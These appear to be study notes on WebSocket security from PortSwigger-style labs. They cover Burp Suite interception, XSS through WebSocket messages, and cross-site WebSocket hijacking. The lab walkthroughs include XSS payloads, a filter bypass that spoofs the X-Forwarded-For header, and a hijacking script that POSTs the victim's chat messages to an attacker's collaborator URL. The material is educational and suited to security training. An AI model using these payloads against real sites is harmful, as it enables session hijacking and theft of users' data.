## WebSockets

### What is WebSocket 
WebSocket is a protocol that allows a persistent, **full-duplex** (two-way) communication between a client and a server over a **single TCP connection**.

WebSocket keeps the connection open, unlike HTTP protocol which helps in **real-time**, fast communication.

### Why does WebSocket exist
- Apps like Games, chat, notifications need instant data exchange  
- In HTTP protocol you need to constantly poll data from the server which is inefficient
- WebSocket solves this issue by creating a light, always open, two way communication channel.


### Why does WebSocket vulnerability exists
- WebSockets are used for all kinds of purposes, including performing user actions and transmitting sensitive information. Virtually any web security vulnerability that arises with regular HTTP can also arise in relation to WebSockets communications


### Manipulating WebSockets Traffics
- Finding vulnerability in WebSockets generally involves manipulating the WebSocket requests in a way that the application does not expect.
```
1. Intercept and modify WebSocket requests 
2. Reply and generate new WebSocket message
3. Manipulate WebSocket connection
```


*You can configure whether client-to-server or server-to-client messages are intercepted in Burp Proxy. Do this in the Settings dialog, in the WebSocket interception rules settings*

### Replaying and generating new WebSocket messages
- Send the request to the repeter from intercept tab or WebSocket History. 
- Now you should be able to edit message and send it over and over.
- You can enter a new message and send it in either direction, to the client or server. 


### Manipulating WebSocket connections 
- Some reason where manipulating
  - Can enable to reach more attack surface.
  - Some attacks may drop the connections so you may need to establish a new one.
  - Tokens or other data in the original handshake request might be stale and need updating.

- Send a WebSocket message to Burp Repeater as already described.  
-  In Burp Repeater, click on the pencil icon next to the WebSocket URL. This opens a wizard that lets you attach to an existing connected WebSocket, clone a connected WebSocket, or reconnect to a disconnected WebSocket. 
- If you choose to clone a connected WebSocket or reconnect to a disconnected WebSocket, then the wizard will show full details of the WebSocket handshake request, which you can edit as required before the handshake is performed 
- When you click "Connect", Burp will attempt to carry out the configured handshake and display the result. If a new WebSocket connection was successfully established, you can then use this to send new messages in Burp Repeater

### WebSockets security vulnerabilities
- User-supplied input transmitted to the server might be processed in unsafe ways, leading to vulnerabilities such as SQL injection or XML external entity injection. 
- Some blind vulnerabilities reached via WebSockets might only be detectable using out-of-band (OAST) techniques.  
- If attacker-controlled data is transmitted via WebSockets to other application users, then it might lead to XSS or other client-side vulnerabilities.  

### Manipulating WebSocket messages to exploit vulnerabilities
- Majority of WebSocket vulnerabilities can be found by tampering with content of WebSocket message.
For e.g. 
```
{"message":"Hello Carlos"}
```

The contents of the message are transmitted (again via WebSockets) to another chat user, and rendered in the user's browser as follows:

```<td>Hello Carlos</td>```

We can try XSS over here 

```
{"message":"<img src=1 onerror='alert(1)'>"}
```

WebSocket vulnerabilities can only be found by Manipulating the WebSocket handshake. It may be due to design flaws such as, 

1. Misplaced trust in **HTTP** headers to perform security decisions, E.g. `X-Forwarded-Host`.
2. Flaws in Session handeling mechanisms, As the Session context in which WebSocket messages processed is generally determined by the Session context of the handshake.
3. Attack surface introduced by custom HTTP headers used by the application.


### Using cross-site WebSockets to exploit vulnerabilities 
If an attacker makes an cross-domain WebSocket connection from a website that is controlled by the attacker then it's called, Cross-site  WebSocket hijacking attack. It involves exploiting a CSRF vulnerability on a WebSocket Handshake.

### What is cross-site WebSocket hijacking?
It requires a Cross-Site Request Forgery (CSRF) vulnerability on WebSocket handshake. It arises when the WebSocket handshake request relies solely on HTTP cookies for session handling and does not contain any CSRF tokens or other unpredictable values. 

### Performing a cross-site WebSocket hijacking attack
The first step is determine if the WebSocket Handshake is protected against CSRF.
*You typically need to find a handshake message that relies solely on HTTP cookies for session handling and doesn't employ any tokens or other unpredictable values in request parameters*



```
GET /chat HTTP/1.1
Host: normal-website.com
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
Connection: keep-alive, Upgrade
Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2
Upgrade: websocket
```

This request is probably vulnerable to CSRF as it solely depends on session token transmitted in a cookie 
*The Sec-WebSocket-Key header contains a random value to prevent errors from caching proxies, and is not used for authentication or session handling purposes.*

If a WebSocket is vulnerable to CSRF, Then an attackers web page opens WebSocket connection on the vulnerable site. 

* Sending WebSocket messages to perform unauthorized actions on behalf of the victim user.
* Sending WebSocket messages to retrieve sensitive data. 
* Sometimes, just waiting for incoming messages to arrive containing sensitive data



### Labs

#### Lab: Manipulating WebSocket messages to exploit vulnerabilities

1. Intercept the reqeust send WebSocket message to Repeter 
2. Update the message param with the following ```<img src=x onerror=alert(1)>```

```
{
        "message": "<img src=x onerror=alert(1)>"
}
```


#### Lab: Manipulating the WebSocket handshake to exploit vulnerabilities

1. Send payload `<img src=x onerror=alert(1)>`
2. Server will detect the payload and band your IP address 
3. Bypass the HTTP handshake by adding an additional header `X-Forwarded-For: 1.1.1.1`
4. Now as the WebSocket is connected send the following payload ```<img src=1 oNeRrOr=alert`1`>```


####  Lab: Cross-site WebSocket hijacking 
1. Check the live chat feature
2. Now check the webstocket upgrade request, it does not have CSRF token 
3. Now craft a CSRF request 
  ```html
    <script>
      var ws = new WebSocket('wss://your-websocket-url');
      ws.onopen = function() {
          ws.send("READY");
      };
      ws.onmessage = function(event) {
          fetch('https://your-collaborator-url', {method: 'POST', mode: 'no-cors', body: event.data});
      };
  </script>
```
4. Store it to exploit server 
5. Deliver the exploit to the victim 